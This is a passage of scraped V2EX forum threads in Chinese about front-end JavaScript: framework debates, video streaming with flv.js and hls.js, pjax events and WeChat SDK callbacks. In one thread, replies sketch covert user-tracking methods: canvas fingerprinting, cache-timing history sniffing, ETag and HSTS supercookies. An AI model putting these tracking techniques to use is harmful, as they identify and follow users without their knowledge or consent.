并不是，这么多年前端发展下来，估计都发现事实上你没法在写 js 的时候彻底抛开 markup 那些各式各样的标签，来回切模版查看这类事情很多经历过模块化加模版渲染的人肯定都有体会。并不是简单展示就不用了，因为你始终最后还得大改各种界面设计", " 原型有多丑陋？", " 和 java 、 c++的 oo 比呢？", "现在 v 站真是天天黑前端黑 JS ，满满优越感  ：）逃", " js 为什么要和 java 、 c++的 oo 比？", "no no no  只有我会火。", " v 站诸君发现了挣铜币致富之道", " 庙小妖风大，水浅王八多 。。。。", "前端 doge\r", " 一二三四五，五四三二一……", " 这文章也被我捷足先登了， ", "很多时候前端做的活，并不是把功能实现出来就可以的，\r", "而且前端也有自己的侧重方向啊，有人喜欢走数据处理，有人喜欢走用户体验；\r", "有人重 JS ，有人重 HTML/CSS ；而且不同公司的业务也不一样的，又不是所有前端都做一样的活；越接近使用者的职位，肯定分歧和改动越大的；\r", "按照楼主的想法，那些做设计师的同学岂不是都是傻子？\r", "老板和产品无论要什么设计稿，网上肯定都有很多源文件的，下载后替换文字就可以了，设计师何必花时间花精力再去重新设计一套呢？", " vanilla js = = 我不是前端  我就看看", "前端坑刚退出来的时候 angular 刚火，现在是啥行情了", " 网页上直接挂 html 就行了，还要啥 js 反正都是丑陋的。\r", "\r", "js 是前端的发展方向， node 是后台的一种方案，既然 java 的 oo 很不错，为什么世界上还有这么多后台语言\r", "\r", "不要总以后端的思想考虑前端，就像你们觉得前端工程师用前端的思想去写后端是很可笑的一件事", " 因为鼓吹 ts 和 es6 class 的是同一批人啊", " 这些东西就前端用，和其他语言有什么关系？", " 据说快 ng4 了", "用 vue 很舒服，入门+上手，一周给公司开发了一套工具系统。\r", "技术这东西，用不爽就不用，用得爽偷着乐。\r", "\r", "所谓的方案、思想、风格都是为了解决问题的，没有问题没必要硬上。", " 你说的对，工具是促进生产，解决实际业务问题"]},
{"content": ["<div class=\"topic_content\">有什么方法能够解决这个问题，现在使用的是 XMLHttpRequest 。主要是想分段加载一些流媒体 =w=。</div>", "<div class=\"topic_content\">#4\r<br><a target=\"_blank\" href=\"https://www.npmjs.com/package/videostream\" rel=\"nofollow\">https://www.npmjs.com/package/videostream</a>\r<br>#19\r<br>播放 flv 文件： flv.js 。 \r<br>播放 m3u8 分片列表：使用 hls.js 。 \r<br>MSE+XMLHttpRequest 加载流媒体：参阅 flv.js 源码 src/io/xhr-range-loader.js 以及 src/core/mse-controller.js 。</div>"], "reply": "20", "tittle": "使用 js 读一个视频文件并转为 blob，但是不能边载边播。", "comment": ["看 bilibili 的开源项目 flv.js 应该有帮助", " 看不懂 T_T\r", "我也觉得有帮助 所以提问之前看过 github", "m3u8 格式的应该可以分段吧", " 这个直接在浏览器运行不能用。。 npm 不是 nodejs 的包管理器么。。\r", "这个看起来没问题，不过 js 新手表示不懂", "标记一下", "可以， youtube 的播放器就是这么干的", "  你需要 browserify", " 试了试，结果找不到模块懵逼了。。\r", "echo \"var videostream=require('videostream');\" > 1.js && npm install -g npm && npm install -g videostream && node 1.js\r", "然后就看到这个。。 Cannot find module 'videostream'", " 好吧，是我的-g 参数。。", " 然后我用示例直接报错了。。\r", "var elem = document.createElement('video');", "ReferenceError: document is not defined", "官网原话是： npm is the package manager for JavaScript.", " 咦 你是在浏览器运行报的错吗。(ReferenceError: document is not defined)", " 我运行 node 1.js > 2.js 报的错...\r", "浏览器运行就是 require 报错", " document 是浏览器上定义的一个 Object ，所以肯定不是 node 直接执行。 require 报错这个问题，你需要找一个打包工具来帮你做这个 require 操作。\r", "\r", "先执行 npm install 安装 package.js 中的对应依赖，然后运行打包工具把 index.js 跟 index.js require 的其他库打包成一个文件，然后插入 html 文件中。\r", "\r", "打包工具有楼上说的 browserify ，也有 webpack 等等。", " js 渣表示非常感谢~，把 require 的库打包成一个文件后在浏览器中直接使用吗。", " \r", "\r", "是的是的， html 直接 src 进去。\r", "另：头像好眼熟 233", "如果单纯想播放 mp4 文件， video src 里直接添加就好。 \r", "如果想播放 flv 文件， 请使用 flv.js 。\r", "如果想播放 m3u8 分片列表， 请使用 hls.js 。\r", "如果想使用 MSE + XMLHttpRequest 加载流媒体， 请参阅 flv.js 源码 src/io/xhr-range-loader.js 以及 src/core/mse-controller.js", " 好评\r", "最后两个对我有帮助，感谢~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在做一个网页, 环境 LNAMP, PHP 只能获取到客户端 IP 地址, 现在我想获取到有唯一性的客户端识别码, 比如 MAC 之类的. 思路是用 JS 获取然后提交到服务器上, 但网上搜了搜除了用 IE + ActiveX 没啥其他方法了. 请问 V2 的大佬: 有没有什么方法可以获取到客户端 MAC? 如果不能获取到, 有没有类似的信息可以获取到呢?</p>\n</div></div>"], "reply": "21", "tittle": "JS 怎样获取客户端唯一识别信息", "comment": ["canvas", "Don't do that", "你姐姐的隐形眼镜还好吗", "没有办法，要不试试画布指纹加 cookie 加 etag 加浏览器信息采集组合拳？", "这种行为....", "浏览器指纹么？ Fingerprintjs2  但如果你真的是想要 MAC 地址 我想也许是很难的吧？？", "canvas ，学到了", "利用缓存跟踪，最难避免", "canvas ，学习了+1", "canvas 那个不行，重复率还是很高的，我试了几个 iphone 手机都一样的指纹", "1. 浏览器在使用过程中，所使用的缓存机制会暴露。\r", "你最近访问过支付宝，那么在缓存期间，访问支付宝的响应速度会很快。这些对于不同网站的访问速度，可以得出类似用户访问历史的数据，而每个人这份数据都是不同的，你爱淘宝我爱天猫就是如此。\r", "\r", "这个是很有意思的一个思路，比如下边这个\r", "\r", "这个几乎无解，浏览器 设置成 隐私模式 你很难 跟踪某个客户，\r", "用 IP 来判断 很容易误伤，尤其是现在 手机 这么多设备都是 在公网 IP 后面\r", "另外广域网 无法跟踪对面的 mac\r", "\r", "当然针对普通用户 cookies 就差不多够了", "MAC 地址基本无解\r", "\r", "可以有类似的指纹比如 Canvas Fingerprint", "和 php 、服务环境没关系，任何服务端环境、任何语言，都只能获取数据报文里有的东西。\r", "MAC 就别想了。连运营商都拿不到 NAT 里面设备的 MAC 。\r", "\r", "另外，除了 IP 地址，其他信息都可以 0 成本伪造。如果目的是为了限制重复注册之类的，这没用。", " 看了你的回复，忍不住去看了那贴，也想知道那个隐形眼镜拿掉了么…", "Canvas FingerPrint 没什么意义，我去年测试的结果是“由浏览器在不同环境下生成的 Canvas 图像不同而得以追踪用户，所以是跟着浏览器走。无法被清除，但当浏览器更新，或是安装什么奇怪的软件后可能便会被视为一个新用户。在 IE10+生成的信息完全一样，在同配置的 iPhone 上生成的信息也完全一样。其它浏览器下重复率非常高。”\r", "\r", "当时最有意义的还是 HSTS SuperCookie ，不过 Firefox 34+也不能用了，而且这玩意慢的要命。总之，你只能综合判断，但没法获知身份。", "让用户注册吧", "cookie+注册", "js 获取不靠谱吧"]},
{"content": ["<div class=\"topic_content\">pjax 刷新的区域带有&lt;a  onclick=\"\"&gt;这种  onclick 事件，在第一次页面加载时  onclick 事件点击是有反应的（）,\r<br>pjax 请求后  onclick 事件就不生效了，用了$(document).on()那种还是不行。</div>"], "reply": "41", "tittle": "Js 小白问个 pjax 的问题", "comment": ["pjax?", "小白问个问题:什么是 pjax?", "pjax 后要重新绑定事件", "用 pjax 还不如用 angular", "  怎么重新绑啊 搜了下是$(document).on 那个写法  写了 pjax 后还是没触发事件", "  嗯啊", "  额 没用过额。", "$.on 都不行那要不说明你写错了要不说明你浏览器环境没救了\r", "po 主发出来这效果说不定表明 v2 有可以利用的 xss 漏洞 @", "  pjax 刷新第一次的区域有个 a 标签 里面有个 onclick 触发事件，后来我把 onclick 去掉了给 a 加了个 id 然后写$(document).on 那个 ，第一次进界面可以，后来 pjax 请求刷新那个区域后，就不能了。。填充的区域 a 也加了 id 的。", " 1. V2EX 的 Markdown 允许一些安全标签\r", "2. 楼主的原帖里有这样的安全标签\r", "3. 楼主的原帖不应该用 Markdown 渲染，因为这样会导致其中的安全标签无法显示。现在改为 default 渲染之后应该可以表达原意", "怎么 a 标签没有 href  属性呢?", "  Markdown 渲染是啥 ``` ```吗  我直接手打的。。", " 如果你用的是 ", " 这个地址发帖，那么帖子会默认用 Markdown 渲染。", "很久之前我们前端教训我，要用 on 代理。。。", "  you 啊 不过里面是 void 那种", " 额 好吧 不是很懂呢", " 首先确定一下，你知道 on 是怎么用的吧？\r", "好比说你 DOM 结构是\r", "<div id=\"a\"><div id=\"b\"></div></div>\r", "然后你要用 ajax 刷新#b 节点\r", "那你要$('#a').on('click', '#b', function() { /* ... */ })来代理\r", "你确定是用类似这种方式吧？", " \r", "\r", "<div id='pjax-container'>\r", "<a href='' id='add'></a>\r", "</div>\r", "\r", "$(document).on('click','#add',function(){\r", "});\r", "\r", "这种  刷新区域是 pjax-container 也是这个区域会被一个准备好的区域替代，除了数据不一样其他都一样\r", "刚开始进界面 on 事件有用， pjax 后 on 事件没用了", "也许你那页面用了什么别的框架比如什么模板库来替换一大块 DOM\r", "建议可以慢慢剥掉外层的无关代码，一边确定问题是否能重现\r", "最后找到能重现的最少的代码，运气好的话还能找到 ajax 后能触发 click 的代码\r", "然后对比这两套代码\r", "还找不到问题可以把最少的可以重现的代码发出来，这样别人也能帮你查", " spectre.css 的作者？", "一般我是重新 hook", " 我还是喜欢 Default 。\r", "发帖时也提供个和编辑一样的选项就好了，编辑有时限", "事件要重新绑定才行的", "是不是 id 重复了？新页面是否有新 js 变量替换了$?\r", "按说绑定到了 document 就不用重新绑定了，坐等看看 LZ 犯了啥低级错误- -", "pjax 有自己的事件，如果你用的是 $(document).ready(function(){...}) 这种肯定是只触发一次的。\r", "你可以在 pjax 自己的事件上重新做你的绑定操作。详情见文档。", "用事件委托，我觉得是这个问题。不要直接把事件绑定到你要替换的元素上。", " ...dota 幽鬼！", " 新页面和旧页面一样的 只是数据不一样了，这个 pajax 请求是个分页请求只是数据不同了而已", "现在还有人用 pjax ？还是换更新的技术吧", "  看到了 pjax:complete 这个 不过我在这方法里写$(document).on 还是不起作用 汗", "隐式绑定事件 obj.on('click','dim',function(){})", "额 lz 可以了 重新绑定事件后 需要覆盖的<div>范围把我的 modal 覆盖了。。一直以为是没响应链接。", "好像都不要重新绑定事件。。马丹 div 区域没看好。", "一般在回调里面重新绑定子元素的事件,暂没有遇到过无效的情况", " 哈哈，果然是低级错误。绑定到 document 页面没有刷新一般是不需要重新绑定的", "可以使用$(document).on('click', 'a', function(){})绑定。因为你 pjax 后 a 元素就未绑定了。", " HAHA 我直接在 a 链接里写 onclick 返回的 a 里也有 onclick 就好了", " 换新技术的话，怎么低成本的解决 SEO 问题？", " 什么新技术呢？", " 当然是服务端渲染啊……\r", "\r", " 各路 MVVM 框架", " 还是不够“低成本”，我们用的 PHP, 不太熟悉 nodejs ，看起来 vuejs 有方案。但 PHP 的话模板和路由都有点麻烦，而 Pjax 的部署和调试只需要在普通网站的基础上增加 4 ～ 8H 的工作量而已。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>刚刚在逛 B 站时 无意间点了一下分享按钮，里面可以直接分享到 QQ 。查看元素发现他并没有使用 Web Share API 而是向服务端发送了一条请求。想问下这是怎么实现的？？</p>\n<p>这是截图</p>\n<p><img alt=\"截图\" src=\"https://hanyang.me/20161221145153.png\"></p>\n</div></div>"], "reply": "4", "tittle": "B 站无线端 视频详情页的分享实现方式是什么？", "comment": ["你这样把 cookie 发出来真好么...", "应该是绑定过 QQ 好了吧，申请过相关的 oauth 权限？", " 呃 没想那么多。。。", " 嗯应该是的吧 我在看 [腾讯移动 Web 开发平台]( ", ")"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最初 用的是 marked  可是 扩展性麻烦  还不能过滤危险的 html 标签<br>\n然后又找其他的轮子 都扩展性麻烦。。<br>\n于是 嗯自己动手 写了改写了改写了改 终于弄出一个满意的了</p>\n<p>感觉造轮子 是熟悉一个语言结构 最快的方法</p>\n<h1>github</h1>\n<p><a href=\"https://github.com/lian-yue/markdown-x\" rel=\"nofollow\">https://github.com/lian-yue/markdown-x</a></p>\n<p>虽然语法扩展性 对 html 过滤 都满意了 可是性能不怎么不满意中规中矩</p>\n<h1>支持</h1>\n<ol>\n<li>自定义 markdown 语法</li>\n<li>自定义 html 标签</li>\n<li>过滤 html 标签</li>\n<li>过滤 html 属性</li>\n<li>过滤 html 属性的值</li>\n</ol>\n<h1>期望</h1>\n<p>期望大家给予<strong>代码质量</strong>，<strong>易用性</strong>， <strong>bug</strong> 等等的评价 才出炉的轮子 估计问题有点多吧</p>\n</div></div>", "<div class=\"topic_content\">演示 地址  \r<br><a target=\"_blank\" href=\"https://lian-yue.github.io/markdown-x/\" rel=\"nofollow\">https://lian-yue.github.io/markdown-x/</a></div>"], "reply": "3", "tittle": "造轮子 系列 用了好多个 markdown 解析器都不满意 于是自己写了个", "comment": ["额 来个 demo 嘛", "  已添加 演示", "谢谢，支持一下"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>可以拖动行，也可以拖动列， ES6 编写，简单易用，多种模式可选。<br>\n我还在继续优化这个插件，<strong>点个 star 收藏一下吧</strong>:) ，这是我的第一个 repo ，每个 star 都让我倍受鼓励。</p>\n<p><a href=\"https://github.com/sindu12jun/table-dragger\" rel=\"nofollow\">github 项目地址</a><br>\n<a href=\"https://sindu12jun.github.io/table-dragger/\" rel=\"nofollow\">演示 demo ，自己动手来操作</a></p>\n</div></div>"], "reply": "1", "tittle": "这是第一个使用原生 JS 编写的，可以让表格自由拖动排序的插件", "comment": ["兄弟，我也用原生拖拽写了个类似的，给个联系方式，交流一下？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>知乎传送门： <a href=\"https://www.zhihu.com/question/53625252/answer/135820259\" rel=\"nofollow\">https://www.zhihu.com/question/53625252/answer/135820259</a></p>\n<p>利益相关：不认识阿当……用过 Angular 1 、 React 、 Vue 、 SCSS 、 LESS 、 Grunt 、 Gulp 、 Webpack 等一系列有的没的。</p>\n<p>前端三大爱好：<br>\n1. 语法糖<br>\n2. 字符串转换<br>\n3. 用别人的框架</p>\n<p>现在说 Angular 、 React 或者 Vue 的不好，都是政治不正确滴。</p>\n<p>声明，我没说我站在阿当这一边哈。我可是很怕得罪了整个前端界的呢 O(∩_∩)O ！。</p>\n<p>不过依照中国大部分前端的计算机基础知识素养，能跟阿当正面撕逼的也没多少个。</p>\n<p>其实我觉得吧，中国的前端就是认死理，非要给自己带一个「前端」的帽子，生怕别人不知道他只会 JS 。多看看不同意见，多看看别的语言，你会发现 JS 能做的，很少很少。</p>\n<p>以下是我自己理解的，以阿当的口吻说的，大家不要以为真的是阿当说的：</p>\n<blockquote>\n<p>2016 年我喷了 Sass 、 React 和 Angular ，被前端各种布道者鄙视，于是我们互相伤害起来。<br>\n但我研究的技术可比你们学得这点东西多多了。<br>\n我以我的经验，认为这些才流行几年的玩意儿，是值得怀疑的。<br>\n1. 有些玩意是高手发明出来给高手用的，小公司的几个前端玩得转？<br>\n2. 你们这些布道者只说优点不说缺点是什么意思？安利你听说过没。<br>\n所以前端新人们，你们要长点脑子，别听风就是雨。</p>\n</blockquote>\n<p>关于 SCSS 和 LESS</p>\n<blockquote>\n<p>优点你们都吹得那么好，我偏说缺点。<br>\n直接能运行在浏览器里的 CSS 你不用，加一道字符串变化在中间挡着，一来增加上手门槛，要学新知识；二来新的语法增加新的复杂度；三来这玩意有传染性，我想用你的代码我就必须也用 SCSS/LESS 。<br>\n而且，你 SCSS/LESS 依然没有解决你想要解决的问题呀！<br>\n所以我认为弊大于利。</p>\n</blockquote>\n<p>跨界、 CoffeeScript 、 TypeScript 和 ES6</p>\n<blockquote>\n<p>前端你为啥这么在意语法糖？你个前端不好好研究优雅的用户体验，去研究什么语法糖，你忙得过来吗？<br>\nCoffeeScript 是 Ruby 社区搞出来的， TypeScript 是 C# 社区搞出来的，它们都是非前端社区的产物，迎合的也是非前端的工程师群体的编程习惯。适不适合前端，走着瞧。<br>\n最终你们这些前端看上了 ES6 ，但是你们这些前端在语法还没成型的时候就用 Babel 来转译是不是有点太激进啊？<br>\n学学 jQuery ，通过原生 JS 来加语法糖，稳定过渡。你们前端咋这么猴急呢？</p>\n</blockquote>\n<p>关于 Node</p>\n<blockquote>\n<p>Node.js 作者本人就把这玩意儿当个玩具，你们前端居然当个宝。<br>\n前端没有拿着玩意写后台，而是那它做脚本。<br>\n写写脚本就算了，前端居然还妄图一门语言统一前后端。然后整天布道什么「全栈」。<br>\n可是孩子呀，你一个跟 DOM 打交道的人能理解后端那些概念吗？你们就知道个 JS ，连数据库也只喜欢长得像 JSON 的 MongoDB 。<br>\n半吊子想当架构师。<br>\n你们看看现在有几个公司用 Node 做服务器啊？服务器端 Node 完败。<br>\n你们这些不会写 shell 的人就老老实实用 Node 写脚本吧。<br>\n但是你们写脚本也要有个限度好不好？看看现在的前端工具流有多复杂了啊。而去年的工具今年你们就抛弃了。<br>\n孩子气。</p>\n</blockquote>\n<p>关于跨界、全栈、公司定岗</p>\n<blockquote>\n<p>前端这么乱，不就是因为前端没主见吗，尽听别的圈子扯。<br>\nCoffeeScript 是 Ruby 社区的； LESS 也是 Ruby 社区的； Node 的作者就是一个票友，平时根本不用 JS ； Angular 是 Google 的服务端团队搞的； React Native 是为了做原生 App ；全是跨界的！<br>\n他们解决的是他们自己的问题，对你有没有用你不想想？<br>\n你引入任何一个中间层都会有弊端，你不知道吗？<br>\n你用技术要在在乎其缺点。</p>\n</blockquote>\n<blockquote>\n<p>全栈。<br>\n你想做全栈我不反对，但是你要看看公司给不给你机会呀。<br>\n你以为你学了 Node 公司就愿意你去开发后台？你有这个能力吗？<br>\n你以为你学了 React Native 公司就愿意让你开发 App ？你有这个能力吗？<br>\n你真的比得过人家专职团队吗？<br>\n全栈是顶级高手团队才有的， Google 、 Facebook 。在小公司还是安心做前端把。</p>\n</blockquote>\n<p>关于前端的核心竞争力</p>\n<blockquote>\n<p>前端你不要拿自己的弱项跟别人的强项比了，找死呀。<br>\n你拿 Node.js 跟 Python 后台比得了？他们学起 Node.js 不甩你一条街啊？<br>\n你拿 React Native 跟 iOS 开发比得了？他们学起 React Native 不甩你两条街啊？<br>\n用 Java 写安卓应用的程序员什么时候找死跟 Java 后台程序员抢饭碗了？<br>\n用 C++ 写桌面应用的程序员什么时候找死跟 C++ 服务器程序员抢饭碗了？<br>\n就你能啊？<br>\n你前端的核心竞争力应该是搞清楚浏览器上面的东西！<br>\nHTML 标签、 CSS ， JavaScript ， Form2.0 、 Websocket 、离线缓存、 Webworker 、 Border-image 、 Canvas ……<br>\n这些东西是有难度的。你让一个后端开发写个 CSS 垂直居中并说出优缺点你看他会不会。要想破头啊。这东西靠经验啊。<br>\n你不好好看核心，去学一些乱七八糟的是什么意思？<br>\n那么什么是核心呢？ HTML 、 CSS 和 JavaScript （我认为还有 HTTP ）<br>\n现在的那些个前端布道师，不讲核心专讲新技术，又是几个意思？</p>\n</blockquote>\n<p>关于 Angular ，后台， SPA</p>\n<blockquote>\n<p>这是给服务器同学用的，如果你的团队以服务器开发人员为主，你再用这个吧。<br>\n你们这群没主见的前端，追捧这个干什么？根本就不是给你用的好吗？ Angular 2 一升级你是不是又傻眼了，怎么后端又改用 TypeScript 了？<br>\n你去追前端基本功呀！<br>\n另外 Angular 真的好吗？其实后端程序员可以自己找前端同学封装一些更轻量的框架。（你们前端不行？当我没说）</p>\n</blockquote>\n<p>关于 React</p>\n<blockquote>\n<p>React 组件化的思路，我是认同的。 Flex 的组件化方案比 HTML 不知高到那里去了。 React 组件化 是对 HTML 很好的扩展。<br>\n但是 React 太重了，条条框框太多了，把简单事情搞复杂了。<br>\n我推崇「轻框架 + 组件化 + 面向对象」。你们不好好改进原来那一套运行得不错的方案，为什么非要去追新，而且还一年换一个星来追。<br>\n如果 React 就火个几年，后面的前端新人不学 React ，你这个 React 项目谁来负责？你怎么跟公司交代？用新框架重写？！<br>\n你作为个人学习去玩玩 React 我是鼓励的。<br>\n关于抽象和面向对象，你真的掌握了吗？封装、继承、多态、设计模式、解耦、 API 设计这些真的都熟练了吗？我接触过的前端，绝大多数同学都毫无概念。来看看我的代码。</p>\n</blockquote>\n<p>关于 SPA 和 Web Site</p>\n<blockquote>\n<p>SPA 不是说你动态加载页面和数据就叫做 SPA 的。 SPA 强调的是功能。你要用新技术做出新的功能。现在中国有几个是真正意义上的 SPA 页面？网页游戏、在线 IDE 、网页版 PhotoShop 之类才是真正的 SPA 。<br>\n所以别老是说什么你在做 SPA 。</p>\n</blockquote>\n<p>React Native 和 PhoneGap</p>\n<blockquote>\n<p>不看好。除了开发成本低，没有任何优点。但是哪个公司是因为开发成本低成功的？</p>\n</blockquote>\n<p>关于微信小程序</p>\n<blockquote>\n<p>这玩意既不是 HTML 5 也不是 Native ，不看好。</p>\n</blockquote>\n<p>关于前端的缺人和高薪水</p>\n<blockquote>\n<p>现在前端多，只是因为前端太少，跟新技术没关系。<br>\n同时 HTML 5 的应用场景变多了，所以需要更多前端了。<br>\n等前端足够多了你再看看你的工资。<br>\n最终工资高的，还是基础知识好的人。</p>\n</blockquote>\n<p>写在最后</p>\n<blockquote>\n<p>虽然我写了这么多，但也有可能，全是错的。</p>\n</blockquote>\n<p>握草怎么这么长，中途差点就想关网页了。<br>\n你就摘对自己有用的看吧。其实他说的也是有道理的。<br>\n而且我跟他的观点是一致的。</p>\n</div></div>", "<div class=\"topic_content\">尤大神微博发言了！应该会发文反击。\r<br>我对尤大神的评价已经准备好了。\r<br>尤大神说的也有道理！支持。\r<br>\r<br>你现在懂了我的套路了吗？听两种极端的声音，你就会了解真相。\r<br>而不是，站队。</div>", "<div class=\"topic_content\">怎么我成了 V 站运营了。\r<br>回想一下好像是的。\r<br>最近的几篇帖子都是 Top 10 啊。\r<br>不过我的标题取得这么欢乐，你们就一起来吐槽就好了。前端该怎么发展还是怎么发展。痛苦的是前端又不是你对不。</div>", "<div class=\"topic_content\">另外我营造的这么好的欢乐氛围，不要破坏了。马上就圣诞了。🎄</div>"], "reply": "239", "tittle": "这会是 2016 年前端的年末撕逼吗？", "comment": ["楼主，我挺认同你的，就像我觉得前端工程师可以尝试下 Node.js ，但是要我个人用可以，但是在公司商业项目中推行，我还是老老实实用 PHP 吧，不是每个团队都有淘宝 UED 的水平的，技术要为业务服务。兼听则明，注重基础，冷静选择技术方案！", "直接写原生 css 怎么解决浏览器兼容性？", "-o-", "-ms-", "-webkit-", "哪些属性需要这些你记得住吗？", "一些变量和继承的功能是可以用原文中的单独类实现，但是一些数值或计算的需求怎么办？", "觉得 scss/less 学习成本高，可以只用它的一部分功能。上手门槛基本忽略了。", "不能因为一个东西有缺点就不用，你可以只用它的优势部分。", "术业有专攻嘛", "Vue 千秋万代 一统江湖", "看完楼主的文章，总结下来“我不是专门针对你，我是说在座的各位都是辣鸡，直接用 010101 编码才是王道”。", "看第一段就不想看了，语法糖和框架，你以为 java 就少吗？ PHP 就少吗？ Python 就少吗？盯着 js 喷来喷去，什么鸟心理，说的好像后端都是 0 框架原生代码疯狂敲一样", "然后发现楼主是比较清闲, 上班时间来闲扯.", "撕起来就好了", "react 是最好的 js 框架", " 我自己创业，上啥班", "新人多了解行业风向、趋势准没错，再来有实践会更好。老人一味固守老本，闭关锁国，不利自己，也不利于带队，“没办法你的细胞还在不断更新呢！”", "编程语言无所谓好坏，他就是一把剑，这把剑耍的好不好，不是看剑锋利与否，而是看耍剑的人技术是否高超～\r", "\r", " 其实 Mingge js 基础扎实的很呢～", "对 NODE 批判不了解，对于 sass ， react ， vue ， es6 那段批判完全无法理喻。\r", "现在我就在维护着一个纯 js+jq+css 做的东西。痛苦啊。\r", "如果一开始他们是用 react 或 vue 来做，现在根本不会如此痛苦哇。", " 记不住也得记住，这是考点 我被问过 box-model 和 flex 要不要前缀 什么浏览器用什么前缀", "楼主，我挺认同你的", "我们公司给机会\r", "\r", "位置郑州\r", "\r", "Ruby on Rails\r", "React + Ant.Design \r", "Weex", "楼主，我表示你转帖之前动一下脑子。", "全文只有这句话有价值：虽然我写了这么多，但也有可能，全是错的。", "中午刚用 node.js 的文件系统码了一个词法分析器，逃~。", "JS 语法糖多！？", "应用新技术也是要讲场景。 现在好多前端都是为了技术而技术。", "反过来说有什么是前端真正值得推荐的？\r", "浏览器原理吗？ ecmaScript 规范细则吗？还是别的什么？\r", "我倒是觉得撕不起来，因为就没有讨论点。\r", "\r", "楼主说这些技术有问题，某些角度看确实不好，的确现在又回归海洋时代了。\r", "各种工具层出不穷，各种概念相互碰撞，但使用工具和做什么事没多少关系吧？\r", "\r", "脑子是个好东西，有时间多看看书，多了解几个工具，饿不死。", " 感觉前端 js 和 html 什么的，本身就没有什么稳定的基础。因为 html 和 js 的规范一直都在变。现在的 es6 跟 10 年前的 js ，除了基本数据类型一样，连写法都大相径庭了（起码不要写分号了）。想要从 js 里面学习写代码的基础，简直就是缘木求鱼。学一门主要语言比如 C ， JAVA 什么的，才叫基础吧。脚本类语言都是工具而已。他的目的就在于快速实现。哪个工具能快速实现，哪个就是好工具。简单说，页面布局，最早是 table ，后来微软推 iframe ，再后来是 block/inline ，接着就是 float ，现在是 flex. 哪个才是最佳实践？都是技巧，几乎没有知识。一个以技巧和经验累积起来的东西，能叫基础？跟人家学 C 的，学 JAVA 的，怎么比啊。 java 的虚拟机是统一的， c 的环境的单一的， js 运行的浏览器环境完全是各种残，各种坑。在都是坑的跑道上练习长跑，跑再好也参加不了奥运会吧。我觉得应该这样号召，不会 JAVA 的 js 程序员不是好前端。", "个人观点，跨界装逼结果基本都是悲惨的；前端写后端就是扯淡，后端写前端也是逗逼；如果你能同时写前端后端那么我可以认为 你很牛逼，是个全站，但是如果你准备用一种语言称霸前后端，那么我只能认为  呵呵。。。后端那么多语言都要等死吗？ Google 费力搞 Go 是傻逼吗？一线 IT 公司 都是脑残么？\r", "\r", "回到我自己的一贯观点: 永远不要认为自己比别人聪明，发现新大陆的肯定不是你；这不是不思进取，而是量力而行。", "@楼上的楼上， 你不能因为一个东西在发展就说它是不好的，十年前的 js 拿到现在的 chrome 一样能运行。你也不能因为一个东西稳定就说他是好的，易语言也很稳定呀。如果你的论点在于 js 这门语言好不好，其实没什么好讨论的，因为没得选。", "有点为了喷而喷的感觉， SCSS/Less 这些虽然只是语法糖，但是如果要写一个稍微大一点的 App 只用面条式的 CSS 明显是不合适的。一个 import 一个请求，没有变量没有层级，没有 Mixin ，没有简单的颜色处理， calc 计算兼容性又不能算非常好...", "NodeJS 虽然很多地方仍然有待发展，但是也带来了很多东西，不用学习一门新语言就可以写简单的工具，也带来了不少 Electron, VSCode 这样优秀的项目和工具", " 一个程序猿不应该只学 js ，而且同样一开始的时候最好从编译类静态类语言学起。但是不代表你学了这些语言就能很快掌握 js ，反之也是。这不是基础的问题。一个好程序猿不会 java 也可以是好程序猿，只要他对计算机编程的理解到位了就行。", "认同楼主的大部分观点\r", "当然很多偏激之处过于偏激\r", "但是现在前端乱象，真的烦死了\r", "尤其是前端 js ，搞这个的大多不是编程出身，不太会有效的组织代码和规范化。后端代码上，大部分主流程序员，写出来后不依赖文档，别人可以很轻松读懂看懂。写 js 的，见过无数写出来 JS 以后过了三五天自己都读不懂的……", " 什么公司～～", " Rails 提供 RESTful API 前端用 React 这样么？可有分享，我最近也在这么玩，但是我 Rails 水平一般", "吃瓜群众围观", " \r", "民生药业集团\r", "看我发的招聘贴 ", "\r", "\r", "\r", "  \r", "目前没有纯分离， react 只是接管了 rails 的绝大部分的 view 层\r", "用的 react_on_rails 这个 gem 包整合 react 和 rails\r", "用 npm 管理 js 包\r", "\r", "分享随后会整理，目前项目才走了 2 个月，很多东西还都没到最佳实践。", " 恩，感谢解答", " 那应届生的竞争力的怎么表现呢？", "不可否认，楼主的确说出了当前前端圈的浮躁，用了那么多框架和工具，不知道其设计思想的大把。大家只是一窝蜂的跟，跟技术无关", "完全不懂 但是看到一群搞前端的人无原则的纯粹攻击文章作者 让人感觉这些前端自己又能好到哪里去呢", "回归本质，技术为成果服务。谁能解决问题，谁就可以上阵。至于谁解决的累，谁解决的爽，还是自己知道。", "撕撕撕，不过个人觉得出现新技术总是好事，难不成因为 c java 好，就一辈子用 c java 了？不用用怎么知道？", "node 能干的事情和 python 一样多，区别只是有多少人在用。但是这跟他的功能没多大关系。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>微信 js-sdk 文档里写 wx.config 配置完成后的回调函数可以用 wx.ready 和 wx.error 传入，但好像 wx.ready 传入的回调无论成不成功都会被调用，也就是说如果失败的话 wx.error 传入的函数和 wx.ready 传入的函数都会被执行一遍。那这样的话想只在成功后才执行的回调函数该放在哪儿呢？</p>\n</div></div>"], "reply": "9", "tittle": "微信 wx.config 如何判断是否成功", "comment": ["有 debug 模式可以.", "wx.config 的 debug 设置为 true ，执行后无论成功或失败都会有一个带提示信息的 alert", "可以用一个 Promise 来保存状态，这样有两个好处， 一， Promise 来处理异步 二， Promise.state 状态唯一不可修改\r", "```\r", "var p\r", "function checkWx() {\r", "    return p || (p = new Promise((resolve, reject) => {\r", "            if (!navigator.userAgent.match(/micromessenger\\/(\\d+\\.\\d+\\.\\d+)/i)) {\r", "                return reject(new Error())\r", "            }\r", "            wx.error(res => reject(new Error(res.errMsg)));\r", "            // ready 放在后面，好像无论如何 ready 都会执行\r", "            wx.ready(() => resolve(wx));\r", "        }))\r", "}\r", "```", "抱歉……没看仔细", " \r", "坑爹的是它好像是先执行 ready 的，再执行 error 的，这样的话 resolve 先于 reject 执行了， reject 还会起作用吗？另外的话就是我现在是用 async 的时候碰到了这个问题， async 同一个 callback 不能调用两次，这样的话有解吗？\r", "\r", " @", " \r", "debug 模式能解决这个问题吗？我是想做到\r", "wx.config(...);\r", "成功： 